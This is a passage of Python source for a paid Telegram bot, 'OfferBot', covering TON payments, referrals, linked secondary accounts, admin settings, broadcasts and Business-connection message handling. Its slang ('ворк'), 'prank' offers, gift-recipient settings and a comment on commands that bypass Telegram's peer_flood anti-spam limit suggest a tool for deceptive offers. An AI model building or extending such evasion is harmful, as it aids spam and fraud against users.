    owner_uid = int(expected_owner)
    child_uid = int(child)
    if call.from_user.id != owner_uid:
        await call.answer("Этот запрос предназначен другому аккаунту", show_alert=True)
        return
    if db.get_access_owner(owner_uid) != owner_uid or not db.has_paid_primary_access(owner_uid):
        await call.answer("Привязку может подтвердить только аккаунт с собственной покупкой.", show_alert=True)
        return
    if not db.link_paid_secondary_account(child_uid, owner_uid):
        await call.answer("Не удалось привязать: аккаунт уже привязан или имеет собственную активную покупку.", show_alert=True)
        return
    entered_username = pending_access_usernames.pop(child_uid, None)
    expires = db.get_access_expiry(owner_uid)
    expires_text = expires.strftime("%d.%m.%Y %H:%M UTC") if expires else "бессрочно"
    
    try:
        await bot.send_message(child_uid, "Привязка подтверждена. Вы используете подписку основного аккаунта и тот же срок её окончания.", reply_markup=main_menu_keyboard(child_uid))
    except Exception:
        log.exception("Could not notify linked account %s", child_uid)
    
    # Уведомление админу о привязке твинка
    try:
        await bot.send_message(
            cfg.owner_id,
            f"🔗 <b>Привязан твинк</b>\n\n"
            f"Владелец: @{call.from_user.username or 'без username'} (ID: <code>{owner_uid}</code>)\n"
            f"Твинк: @{entered_username or 'без username'} (ID: <code>{child_uid}</code>)\n"
            f"Окончание доступа: <b>{expires_text}</b>"
        )
    except Exception:
        log.exception("Could not notify admin about linked access activation")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.answer("Аккаунт привязан")


@dp.callback_query(F.data.startswith("access_link_no:"))
async def access_link_no_callback(call: CallbackQuery):
    _, expected_owner, child = call.data.split(":", 2)
    if call.from_user.id != int(expected_owner):
        await call.answer("Этот запрос предназначен другому аккаунту", show_alert=True)
        return
    child_uid = int(child)
    await call.message.edit_reply_markup(reply_markup=None)
    try:
        await bot.send_message(child_uid, "Владелец основного аккаунта отклонил запрос на привязку.")
    except Exception:
        pass
    await call.answer("Запрос отклонён")


@dp.callback_query(F.data == "my_referrals")
async def my_referrals_callback(call: CallbackQuery):
    user = call.from_user
    if not user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    db.register_user(user.id, user.username, user.first_name, user.last_name)
    db.register_referral(user.id, None)
    username = cfg.bot_username
    if not username:
        me = await bot.get_me()
        username = me.username or ""
    if not username:
        await call.answer("Не удалось получить ссылку бота", show_alert=True)
        return
    link = f"https://t.me/{username}?start=ref_{user.id}"
    stats = db.referral_info(user.id)
    text = (
        "<b>Реферальная программа</b>\n\n"
        "Приглашайте пользователей по своей ссылке. Когда приглашённый впервые оплатит доступ за 5 TON, "
        "вам автоматически начислится 24 часа доступа.\n\n"
        f"Ваша ссылка:\n<code>{link}</code>\n\n"
        f"Приглашено пользователей: <b>{stats['invited']}</b>\n"
        f"Успешных оплат: <b>{stats['count']}</b>"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Поделиться ссылкой", url=f"https://t.me/share/url?url={link}")],
        [InlineKeyboardButton(text="В главное меню", callback_data="back_to_start")],
    ])
    await call.message.answer(text, reply_markup=keyboard, disable_web_page_preview=True)
    await call.answer()


@dp.callback_query(F.data == "my_profile")
async def my_profile_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    u = call.from_user
    db.register_user(u.id, u.username, u.first_name, u.last_name)
    data = db.user_profile_stats(u.id)
    profile = data.get("profile")
    connection = db.get_connection_for_user(u.id)
    created = data["user"]["created_at"] if data.get("user") else None
    created_text = created.strftime("%d.%m.%Y") if created and hasattr(created, "strftime") else "—"
    transfer_name = (profile.get("name") if profile else None) or u.username
    safe_name = html.escape(display_name(u))
    safe_username = html.escape("@" + u.username if u.username else "не указан")
    safe_transfer = html.escape("@" + transfer_name.lstrip("@") if transfer_name else "не настроен")
    connection_status = "🟢 Подключён" if connection else "⚪ Не подключён"
    
    # Проверяем доступ
    has_paid_access = db.has_access(u.id, cfg.owner_id, cfg.offer_access_mode)
    access_text = "🟢 Активен" if has_paid_access else "🔴 Не оплачен"
    
    text = (
        "<b>👤 МОЙ КАБИНЕТ</b>\n"
        "<blockquote>Ваш профиль OfferBot</blockquote>\n"
        f"✨ <b>{safe_name}</b>\n"
        f"🔗 {safe_username}  ·  ID: <code>{u.id}</code>\n\n"
        "<b>╭ ДОСТУП</b>\n"
        f"├ 💎 Статус: <b>{access_text}</b>\n"
        f"├ 🔌 Business: {connection_status}\n"
        f"╰ 🎁 Получатель: <code>{safe_transfer}</code>\n\n"
        f"<b>📅 С нами с:</b> <code>{created_text}</code>"
    )
    
    keyboard_buttons = [[InlineKeyboardButton(text="🎁 Настроить получателя", callback_data="profile_transfer_help")]]
    
    if not has_paid_access:
        keyboard_buttons.insert(0, [InlineKeyboardButton(text="💎 Купить доступ", callback_data="buy_access")])
    
    keyboard_buttons.append([InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")])
    keyboard_buttons.append([InlineKeyboardButton(text="« Главное меню", callback_data="back_to_start")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    try:
        await call.message.edit_text(text, reply_markup=keyboard)
    except Exception:
        await call.message.answer(text, reply_markup=keyboard)
    await call.answer()


@dp.callback_query(F.data == "profile_transfer_help")
async def profile_transfer_help_callback(call: CallbackQuery):
    await call.answer()
    await call.message.answer(
        "🎁 <b>Получатель подарка</b>\n\n"
        "Отправьте команду со своим Telegram username:\n"
        "<code>/transfer @username</code>\n\n"
        "Например: <code>/transfer @myname</code>"
    )


@dp.callback_query(F.data == "buy_access")
async def buy_access_callback(call: CallbackQuery):
    """Обработчик кнопки 'Купить доступ'"""
    if not call.from_user:
        await call.answer("Ошибка", show_alert=True)
        return
    
    # Новый счёт всегда создаётся по актуальной цене из админки.
    # Старые неоплаченные счета отменяются и не могут подменить новую сумму.
    db.cancel_pending_payments(call.from_user.id)
    current_price = get_payment_price()
    memo = str(uuid.uuid4())[:8].upper()
    payment_id = db.create_payment(call.from_user.id, memo, current_price)

    await show_payment_options(call.message, call.from_user.id, {
        'id': payment_id,
        'memo': memo,
        'amount': current_price
    })
    await call.answer()


async def show_payment_options(message: Message, user_id: int, payment: dict):
    """Показать варианты оплаты"""
    amount = payment['amount']
    memo = payment['memo']
    payment_id = payment['id']
    
    text = (
        "<b>Оплата доступа</b>\n\n"
        f"Стоимость: <b>{amount:g} TON</b>\n"
        f"Срок доступа: <b>{get_access_duration_hours():g} часов</b>\n\n"
        "Выберите способ оплаты:"
    )
    
    keyboard = []
    
    # Tonkeeper
    if cfg.ton_wallet:
        keyboard.append([InlineKeyboardButton(
            text="Оплатить через Tonkeeper",
            callback_data=f"pay:ton:{payment_id}"
        )])
    
    keyboard.append([InlineKeyboardButton(
        text="Проверить оплату",
        callback_data=f"pay:check:{payment_id}"
    )])
    
    keyboard.append([InlineKeyboardButton(
        text="Назад",
        callback_data="back_to_start"
    )])
    
    try:
        await message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    except Exception:
        await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))


@dp.callback_query(F.data.startswith("pay:ton:"))
async def pay_ton_callback(call: CallbackQuery):
    """Оплата через Tonkeeper"""
    if not call.from_user or not cfg.ton_wallet:
        await call.answer("Ошибка", show_alert=True)
        return
    
    payment_id = int(call.data.split(":")[2])
    payment = db.get_payment_by_id(payment_id)
    
    if not payment or payment['user_id'] != call.from_user.id:
        await call.answer("Платёж не найден", show_alert=True)
        return
    
    if payment['status'] == 'paid':
        await call.answer("✅ Уже оплачено!", show_alert=True)
        return
    
    memo = payment['memo']
    amount = payment['amount']
    
    # Формируем ссылку для Tonkeeper
    from urllib.parse import quote
    ton_url = f"https://app.tonkeeper.com/transfer/{cfg.ton_wallet}?amount={int(amount * 1_000_000_000)}&text={quote(memo, safe='')}"
    
    text = (
        "<b>Оплата через Tonkeeper</b>\n\n"
        f"Сумма: <b>{amount:g} TON</b>\n"
        f"Кошелёк: <code>{cfg.ton_wallet}</code>\n"
        f"Комментарий: <code>{memo}</code>\n\n"
        "Укажите этот комментарий при переводе. После оплаты нажмите «Проверить оплату»."
    )
    
    keyboard = [
        [InlineKeyboardButton(text="Открыть Tonkeeper", url=ton_url)],
        [InlineKeyboardButton(text="Проверить оплату", callback_data=f"pay:check:{payment_id}")],
        [InlineKeyboardButton(text="Назад", callback_data="buy_access")]
    ]
    
    try:
        await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    except Exception:
        await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))


@dp.callback_query(F.data.startswith("pay:check:"))
async def pay_check_callback(call: CallbackQuery):
    """Проверка оплаты"""
    if not call.from_user:
        await call.answer("Ошибка", show_alert=True)
        return
    
    payment_id = int(call.data.split(":")[2])
    payment = db.get_payment_by_id(payment_id)
    
    if not payment or payment['user_id'] != call.from_user.id:
        await call.answer("Платёж не найден", show_alert=True)
        return
    
    if payment['status'] == 'paid':
        await call.answer("✅ Уже оплачено!", show_alert=True)
        await call.message.answer(
            "✅ <b>ДОСТУП АКТИВИРОВАН!</b>\n\n"
            "Удачного ворка! Смотри инструкцию 📘",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")],
                [InlineKeyboardButton(text="👤 Мой кабинет", callback_data="my_profile")]
            ])
        )
        return
    
    await call.answer("🔄 Проверяю оплату...", show_alert=False)
    
    paid = False
    
    # Проверяем Tonkeeper
    if cfg.ton_wallet:
        ton_api = TonkeeperAPI(cfg.ton_wallet, getattr(cfg, "ton_api_key", ""))
        try:
            # Проверяем напрямую по свежей истории входящих транзакций TON.
            paid = await ton_api.check_transaction(payment['memo'], payment['amount'])
        except Exception:
            log.exception("TON payment verification unavailable for payment_id=%s", payment_id)
            await call.answer("Не удалось проверить сеть TON. Попробуйте ещё раз через несколько секунд.", show_alert=True)
            return
    
    if paid:
        # Одной транзакцией подтверждаем оплату, выдаём доступ и начисляем 24 часа пригласившему.
        try:
            referral_hours = float(db.get_setting("referral_reward_hours", "24"))
        except (TypeError, ValueError):
            referral_hours = 24.0
        referrer_id = db.confirm_payment_access_and_reward_referrer(
            payment_id, call.from_user.id, get_access_duration_hours(), referral_hours
        )
        if referrer_id is None:
            # None также возвращается при повторной проверке; проверяем статус платежа,
            # чтобы не показывать успешное начисление повторно.
            confirmed = db.get_payment_by_id(payment_id)
            if not confirmed or confirmed.get("status") != "paid":
                await call.answer("Не удалось подтвердить платёж. Попробуйте ещё раз.", show_alert=True)
                return

        caption = (
            "Платёж подтверждён!\n\n"
            f"Доступ к OfferBot активирован на {get_access_duration_hours():g} часов.\n"
            "Удачного пользования!"
        )
        success_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")],
            [InlineKeyboardButton(text="👤 Мой кабинет", callback_data="my_profile")]
        ])
        await send_with_banner(call.message, caption, reply_markup=success_keyboard)
        if referrer_id:
            try:
                await bot.send_message(
                    referrer_id,
                    f"Ваш приглашённый пользователь оплатил доступ. Вам начислено {referral_hours:g} часов доступа."
                )
            except Exception:
                log.exception("Could not notify referrer user_id=%s", referrer_id)

        # Уведомляем админа
        try:
            await bot.send_message(
                cfg.owner_id,
                f"💰 <b>Новый платёж!</b>\n"
                f"Пользователь: {display_name(call.from_user)} (@{call.from_user.username or '—'})\n"
                f"Сумма: {payment['amount']:g} TON\n"
                f"ID: <code>{call.from_user.id}</code>"
            )
        except Exception:
            pass
    else:
        await call.answer("Оплата не найдена", show_alert=True)

@dp.callback_query(F.data == "support_start")
async def support_start_callback(call: CallbackQuery):
    awaiting_support.add(call.from_user.id)
    await call.message.answer("🛟 Напиши сообщение в поддержку одним сообщением. Мы передадим его администратору. Для отмены отправь /cancel.")
    await call.answer()

@dp.callback_query(F.data == "back_to_start")
async def back_to_start_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Ошибка", show_alert=True)
        return
    
    caption = "<blockquote>Привет, выбери действие</blockquote>"
    await send_with_banner(call.message, caption, reply_markup=main_menu_keyboard(call.from_user.id))
    await call.answer()


@dp.callback_query(F.data == "test_privet")
async def test_privet_callback(call: CallbackQuery):
    """Обработчик тестовой кнопки Привет"""
    await call.answer("Привeт! Кнопка работает ✅")


@dp.callback_query(F.data == "show_instruction")
async def show_instruction_callback(call: CallbackQuery):
    if not call.from_user or not db.has_access(call.from_user.id, cfg.owner_id, cfg.offer_access_mode):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Купить", callback_data="buy_access")], [InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]])
        await call.message.answer("Для просмотра инструкции сначала необходим активный доступ.", reply_markup=kb)
        await call.answer()
        return
    try:
        rows = [[InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]]
        await call.message.edit_text(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        await call.message.answer(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]]))
    await call.answer()


@dp.business_connection()
async def on_business_connection(bc: BusinessConnection):
    previous = db.get_business_connection(bc.id)
    should_notify = bc.is_enabled and (previous is None or not previous["is_enabled"])
    db.upsert_business_connection(bc.id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
    db.register_user(bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name)
    log.info("Business connection id=%s user_id=%s enabled=%s", bc.id, bc.user.id, bc.is_enabled)
    
    # Уведомляем администратора о новом подключении
    if should_notify and bc.user.id != cfg.owner_id:
        # Проверяем есть ли доступ
        has_access = db.has_access(bc.user.id, cfg.owner_id, cfg.offer_access_mode)
        is_blocked = db.is_blocked(bc.user.id)
        
        if is_blocked:
            state = "⛔ Пользователь заблокирован"
            db.set_connection_blocked(bc.id, True)
        elif has_access:
            state = "🟢 Доступ оплачен"
            db.set_connection_blocked(bc.id, False)
        else:
            state = "🔴 Доступ не оплачен"
            db.set_connection_blocked(bc.id, True)
        
        try:
            await bot.send_message(cfg.owner_id,
                f"🔌 <b>Business подключён</b>\n"
                f"{display_name(bc.user)} · @{bc.user.username or '—'}\n"
                f"ID: <code>{bc.user.id}</code>\n"
                f"Статус: {state}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🟢 Дать доступ", callback_data=f"adm:allow:{bc.user.id}"),
                    InlineKeyboardButton(text="⛔ Блок", callback_data=f"adm:block:{bc.user.id}")],
                    [InlineKeyboardButton(text="Админка", callback_data="adm:home:0")]]))
        except Exception:
            log.exception("Failed to notify owner")


@dp.business_message()
async def on_business_message(message: Message):
    if cfg.business_debug:
        log.info("[BUSINESS] connection_id=%s from_user_id=%s from_username=%s chat_id=%s text=%s",
                 message.business_connection_id, message.from_user.id if message.from_user else None,
                 message.from_user.username if message.from_user else None, message.chat.id, message.text or message.caption)
    await handle_text(message, True)


@dp.message()
async def on_message(message: Message):
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_admin_search:
        raw = (message.text or "").strip()
        if raw.lower() == "/cancel":
            awaiting_admin_search.discard(cfg.owner_id)
            await message.answer("Поиск отменён.", reply_markup=admin_keyboard())
            return
        admin_user_queries[cfg.owner_id] = raw
        awaiting_admin_search.discard(cfg.owner_id)
        text, markup = admin_users_view(0)
        await message.answer(text, reply_markup=markup)
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_access_duration:
        raw = (message.text or "").strip().replace(",", ".")
        if raw.lower() == "/cancel":
            awaiting_access_duration.discard(cfg.owner_id)
            await message.answer("Изменение срока доступа отменено.", reply_markup=admin_keyboard())
            return
        try:
            hours = float(raw)
            if not (1 <= hours <= 8760):
                raise ValueError
        except ValueError:
            await message.answer("Введите число от 1 до 8760 часов. Например: 48. Для отмены: /cancel")
            return
        db.set_setting("access_duration_hours", str(hours))
        db.log_admin_action(cfg.owner_id, "change_access_duration", None, f"hours={hours:g}")
        awaiting_access_duration.discard(cfg.owner_id)
        await message.answer(f"Срок доступа изменён: {hours:g} часов.", reply_markup=admin_keyboard())
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_referral_hours:
        raw = (message.text or "").strip().replace(",", ".")
        if raw.lower() == "/cancel":
            awaiting_referral_hours.discard(cfg.owner_id)
            await message.answer("Изменение бонуса отменено.", reply_markup=admin_keyboard())
            return
        try:
            hours = float(raw)
            if not (1 <= hours <= 8760):
                raise ValueError
        except ValueError:
            await message.answer("Введите число от 1 до 8760. Например: 24. Для отмены: /cancel")
            return
        db.set_setting("referral_reward_hours", str(hours))
        db.log_admin_action(cfg.owner_id, "change_referral_reward_hours", None, f"hours={hours:g}")
        awaiting_referral_hours.discard(cfg.owner_id)
        await message.answer(f"Реферальный бонус изменён: {hours:g} часов.", reply_markup=admin_keyboard())
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_offer_command:
        raw = (message.text or "").strip()
        if raw.lower() == "/cancel":
            awaiting_offer_command.discard(cfg.owner_id)
            await message.answer("Изменение команды отменено.", reply_markup=admin_keyboard())
            return
        command = raw.lstrip(".")
        if not command or len(command) > 24 or not all(ch.isalnum() or ch == "_" for ch in command):
            await message.answer("Введите одну команду без пробелов и символов, кроме букв, цифр и _. Например: <code>ху</code>. Для отмены: /cancel")
            return
        if command.lower() in {"start", "admin", "админ", "cancel", "broadcast", "transfer", "reply"}:
            await message.answer("Это имя зарезервировано. Выберите другое. Например: <code>ху</code>.")
            return
        db.set_setting("offer_command", command)
        db.log_admin_action(cfg.owner_id, "change_offer_command", None, f"command={command}")
        awaiting_offer_command.discard(cfg.owner_id)
        
        # Рассылка всем пользователям о новой команде
        broadcast_text = f"📢 <b>Новая команда для отправки офера</b>\n\n<code>{html.escape(command)}</code>"
        recipients = db.list_broadcast_users()
        sent = failed = 0
        for uid in recipients:
            try:
                await bot.send_message(chat_id=uid, text=broadcast_text)
                sent += 1
                await asyncio.sleep(0.04)  # Задержка чтобы не словить флуд
            except TelegramForbiddenError:
                db.mark_user_blocked(uid)
                failed += 1
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after)
                try:
                    await bot.send_message(chat_id=uid, text=broadcast_text)
                    sent += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1
        
        await message.answer(
            f"✅ Команда создания офера изменена на: <code>{html.escape(command)}</code>\n"
            "Можно писать её с точкой или без точки.\n\n"
            f"Рассылка завершена: отправлено {sent}, ошибок {failed}.",
            reply_markup=admin_keyboard(),
        )
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_access_grant:
        raw = (message.text or "").strip()
        if raw.lower() == "/cancel":
            awaiting_access_grant.discard(cfg.owner_id)
            await message.answer("Выдача временного доступа отменена.", reply_markup=admin_keyboard())
            return
        parts = raw.split()
        if len(parts) != 2:
            await message.answer("Формат: <code>Telegram ID или @username часы</code>. Например: <code>123456789 48</code>.")
            return
        target, hours_raw = parts
        try:
            hours = float(hours_raw.replace(",", "."))
            if not (0 < hours <= 8760):
                raise ValueError
        except ValueError:
            await message.answer("Срок должен быть от 0 до 8760 часов. Например: <code>48</code>.")
            return
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
        else:
            found = db.find_user_by_username(target)
            if not found:
                await message.answer("Пользователь не найден. Он должен хотя бы раз запустить бота. Попробуйте Telegram ID или /cancel.")
                return
            uid = int(found["user_id"])
        db.grant_timed_access(uid, hours, "admin")
        db.log_admin_action(cfg.owner_id, "grant_timed_access", uid, f"hours={hours:g}")
        awaiting_access_grant.discard(cfg.owner_id)
        try:
            await bot.send_message(uid, f"Вам выдан доступ к OfferBot на {hours:g} часов.")
        except Exception:
            pass
        await message.answer(f"Временный доступ выдан пользователю <code>{uid}</code> на <b>{hours:g} часов</b>.", reply_markup=admin_keyboard())
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_payment_price:
        raw = (message.text or "").strip().replace(",", ".")
        if raw.lower() == "/cancel":
            awaiting_payment_price.discard(cfg.owner_id)
            await message.answer("Изменение цены отменено.", reply_markup=admin_keyboard())
            return
        try:
            price = float(raw)
            if not (0 < price <= 1000000):
                raise ValueError
        except ValueError:
            await message.answer("Введите положительную сумму числом, например 5 или 7.5. Для отмены: /cancel")
            return
        db.set_setting("payment_price", str(price))
        db.log_admin_action(cfg.owner_id, "change_payment_price", None, f"price={price:g} TON")
        awaiting_payment_price.discard(cfg.owner_id)
        await message.answer(f"Цена доступа изменена: <b>{price:g} TON</b>.", reply_markup=admin_keyboard())
        return
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_banner:
        if (message.text or "").strip().lower() == "/cancel":
            awaiting_banner.discard(cfg.owner_id)
            await message.answer("Изменение баннера отменено.")
            return
        if not message.photo:
            await message.answer("Отправьте фотографию как фото, не как файл. Для отмены: /cancel")
            return
        db.set_setting("start_banner_file_id", message.photo[-1].file_id)
        awaiting_banner.discard(cfg.owner_id)
        log.info("START_BANNER_UPDATED admin_id=%s file_id_saved=true", cfg.owner_id)
        await message.answer("Баннер обновлён. Он будет использоваться в следующих сообщениях /start.", reply_markup=admin_keyboard())
        return
    
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_prank_photo:
        if (message.text or "").strip().lower() == "/cancel":
            awaiting_prank_photo.discard(cfg.owner_id)
            await message.answer("Изменение фото пранка отменено.")
            return
        if not message.photo:
            await message.answer("Отправьте фотографию как фото, не как файл. Для отмены: /cancel")
            return
        db.set_prank_photo(message.photo[-1].file_id)
        awaiting_prank_photo.discard(cfg.owner_id)
        log.info("PRANK_PHOTO_UPDATED admin_id=%s file_id_saved=true", cfg.owner_id)
        await message.answer("Фото пранка обновлено. Оно будет использоваться для всех пранк-оферов.", reply_markup=admin_keyboard())
        return
    
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_broadcast:
        if (message.text or "").strip().lower() == "/cancel":
            awaiting_broadcast.discard(cfg.owner_id)
            await message.answer("Рассылка отменена.")
            return
        if (message.text or "").strip().lower() == "/broadcast":
            await message.answer("Отправь текст, фото, видео или GIF для рассылки. Для отмены: /cancel")
            return
        awaiting_broadcast.discard(cfg.owner_id)
        recipients = db.list_broadcast_users()
        sent = failed = 0
        status = await message.answer(f"Начинаю рассылку для {len(recipients)} пользователей…")
        for uid in recipients:
            try:
                await bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
                sent += 1
            except TelegramForbiddenError:
                db.mark_user_blocked(uid)
                failed += 1
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after)
                try:
                    await bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
                    sent += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.04)
        await status.edit_text(f"Рассылка завершена.\nДоставлено: {sent}\nОшибок: {failed}")
        return
    if message.from_user and message.chat.type == "private":
        u = message.from_user
        db.register_user(u.id, u.username, u.first_name, u.last_name)
        if u.id in awaiting_access_transfer:
            entered = (message.text or "").strip()
            if entered.lower() == "/cancel":
                awaiting_access_transfer.discard(u.id)
                await message.answer("Добавление твинка отменено.")
                return
            if db.get_access_owner(u.id) != u.id or not db.has_paid_primary_access(u.id):
                awaiting_access_transfer.discard(u.id)
                await message.answer("❌ Только аккаунт, на котором куплен доступ, может добавлять твинков.")
                return
            target = entered.lstrip("@")
            if target.isdigit():
                child_uid = int(target)
                target_user = db.get_user(child_uid)
            else:
                if not target or not target.replace("_", "").isalnum() or not 5 <= len(target) <= 32:
                    await message.answer("Отправь корректный Telegram ID или @username. Для отмены: /cancel")
                    return
                target_user = db.find_user_by_username(target)
                child_uid = int(target_user["user_id"]) if target_user else 0
            if not child_uid or not target_user:
                await message.answer("❌ Аккаунт не найден. Он должен хотя бы раз запустить бота. Попробуй ID или username.")
                return
            if child_uid == u.id:
                await message.answer("Это уже основной аккаунт.")
                return
            try:
                linked = db.link_paid_secondary_account(child_uid, u.id)
                if not linked:
                    await message.answer("❌ Не удалось привязать аккаунт: основной аккаунт должен иметь активную покупку, а твинк не должен быть уже привязан или иметь собственную активную покупку.")
                    return
                awaiting_access_transfer.discard(u.id)
                expires = db.get_access_expiry(u.id)
                expires_text = expires.strftime("%d.%m.%Y %H:%M UTC") if expires else "бессрочно"
                
                # Уведомление админу о привязке твинка
                try:
                    owner_username = u.username or "без username"
                    child_username = target_user.get("username", "нет") if target_user else "нет"
                    await bot.send_message(
                        cfg.owner_id,
                        f"🔗 <b>Привязан твинк</b>\n\n"
                        f"Владелец: @{owner_username} (ID: <code>{u.id}</code>)\n"
                        f"Твинк: @{child_username} (ID: <code>{child_uid}</code>)\n"
                        f"Окончание доступа: <b>{expires_text}</b>"
                    )
                except Exception:
                    log.exception("Could not notify admin about link %s -> %s", u.id, child_uid)
                
                try:
                    await bot.send_message(
                        child_uid,
                        "✅ <b>Доступ активирован</b>\\n\\n"
                        "Ваш аккаунт привязан к основному аккаунту. Доступ действует до той же даты окончания, что и у основного аккаунта.",
                        reply_markup=main_menu_keyboard(child_uid),
                    )
                except Exception:
                    log.exception("Could not notify secondary account %s", child_uid)
                await message.answer(
                    f"✅ Твинк <code>{child_uid}</code> привязан.\\n"
                    f"Окончание доступа: <b>{expires_text}</b>.",
                    reply_markup=main_menu_keyboard(u.id),
                )
                log.info("ACCESS_LINK_CREATED primary=%s secondary=%s", u.id, child_uid)
            except Exception:
                log.exception("Could not link secondary account primary=%s secondary=%s", u.id, child_uid)
                await message.answer("❌ Внутренняя ошибка при привязке. Доступ основного аккаунта не изменён; попробуй позже.")
            return
        if u.id in awaiting_support:
            if (message.text or "").strip().lower() == "/cancel":
                awaiting_support.discard(u.id)
                await message.answer("Обращение отменено.")
                return
            awaiting_support.discard(u.id)
            try:
                await bot.send_message(cfg.owner_id, f"🛟 <b>Обращение в поддержку</b>\nОт: {display_name(u)} (@{u.username or 'нет username'})\nID: <code>{u.id}</code>\n\nЧтобы ответить: <code>/reply {u.id} текст</code>\n\n" + ((message.text or message.caption or "[медиа]")[:3000]))
                if message.photo or message.document or message.video:
                    await bot.copy_message(cfg.owner_id, message.chat.id, message.message_id)
                await message.answer("✅ Обращение отправлено в поддержку.")
            except Exception:
                log.exception("Failed to forward support request")
                await message.answer("❌ Не удалось отправить сообщение. Попробуй позже.")
            return
    await handle_text(message, False)




def parse_access_duration(raw: str) -> float:
    """Parse duration into hours. Supports 48, 48h, 7d, 30m and Russian units."""
    value = raw.strip().lower().replace(",", ".")
    # Добавлены варианты: ч/час/часа/часов/h, д/дн/дня/дней/d, м/мин/минут/минуты/минута/m/min
    match = re.fullmatch(r"(\d+(?:\.\d+)?)\s*(ч|час(?:а|ов)?|h|hr|hrs|д|дн(?:я|ей)?|d|day|days|м|мин(?:ут(?:а|ы)?)?|m|min)?", value)
    if not match:
        raise ValueError("invalid duration")
    amount = float(match.group(1))
    unit = (match.group(2) or "h").strip()
    if amount <= 0:
        raise ValueError("duration must be positive")
    # Дни
    if unit in {"д", "дн", "дня", "дней", "d", "day", "days"}:
        amount *= 24
    # Минуты
    elif unit in {"м", "мин", "минута", "минуты", "минут", "m", "min"}:
        amount /= 60
    # Часы - по умолчанию
    # unit in {"ч", "час", "часа", "часов", "h", "hr", "hrs"}
    
    if amount > 8760:  # Максимум 365 дней
        raise ValueError("duration too long")
    return amount

async def handle_text(message: Message, is_business: bool):
    text = (message.text or "").strip()
    low = text.lower()
    
    # Режим "только владелец" - игнорируем сообщения других людей в business чатах
    if is_business and db.is_owner_only_mode():
        if not message.from_user or message.from_user.id != cfg.owner_id:
            return  # Молча игнорируем сообщения не от владельца
    
    if low == ".дебаг" or low == "debug":
        if message.from_user:
            u = message.from_user
            with db.connect() as con, con.cursor() as cur:
                cur.execute("SELECT user_id, username, created_at, updated_at FROM bot_users WHERE user_id=%s OR LOWER(username)=%s ORDER BY created_at", (u.id, (u.username or "").lower()))
                rows = cur.fetchall()
                text = f"<b>Записей в базе:</b> {len(rows)}\n\n"
                for idx, r in enumerate(rows, 1):
                    created = r['created_at'].strftime("%d.%m.%Y %H:%M") if r.get('created_at') else "—"
                    updated = r['updated_at'].strftime("%d.%m.%Y %H:%M") if r.get('updated_at') else "—"
                    text += f"<b>#{idx}</b>\nID: <code>{r['user_id']}</code>\nUsername: @{r.get('username') or '—'}\nСоздан: {created}\nОбновлён: {updated}\n\n"
                await reply_message(message, text[:4000])
        return
    if low == ".бизнестест":
        if is_business:
            await reply_message(message, f"✅ Business-сообщение дошло до бота.\n\nConnection:\n<code>{message.business_connection_id}</code>\n\nUser ID:\n<code>{message.from_user.id if message.from_user else '—'}</code>\n\nChat ID:\n<code>{message.chat.id}</code>")
        else:
            await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
        return
    
    # Тестовые команды обхода peer_flood: гой, гой1-4, оф1-4
    first_token = low.split(maxsplit=1)[0].lstrip(".") if low else ""
    if first_token.startswith("гой") or (first_token.startswith("оф") and len(first_token) >= 3 and first_token[2:3].isdigit()):
        await process_offer(message, message.business_connection_id if is_business else None)
        return
    
    # Команда офера настраивается администратором; точка перед ней необязательна.
    active_command = get_offer_command().lower()
    if first_token == active_command:
        await process_offer(message, message.business_connection_id if is_business else None)
        return
    if low.startswith("/admin") or low.startswith("/админ"):
        await admin_command(message)
        return
